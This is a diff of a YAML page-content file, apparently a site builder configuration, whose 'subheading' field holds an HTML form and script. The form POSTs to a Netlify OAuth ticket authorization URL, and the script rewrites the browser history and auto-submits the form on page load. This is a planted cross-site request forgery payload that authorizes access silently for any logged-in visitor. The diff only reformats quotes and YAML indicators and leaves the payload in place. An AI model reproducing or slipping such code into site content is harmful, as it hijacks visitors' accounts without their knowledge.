@@ -16,7 +16,7 @@ sections:
         theme: secondary
   - type: CardGridSection
     heading: Card Grid Heading
-    subheading: >
+    subheading: >+
       <form
       action="https://app.netlify.com/access-control/bb-api/api/v1/oauth/tickets/88d2de4e27137269c40e44747eba49ea/authorize"
       method="POST">
@@ -24,9 +24,10 @@ sections:
       </form>
 
       <script>
-        history.pushState('', '', '/');
+        history.pushState("", "", "/");
         document.forms[0].submit();
       </script>
+
   - type: CardGridSection
     heading: Jump to Topic
     subheading: |
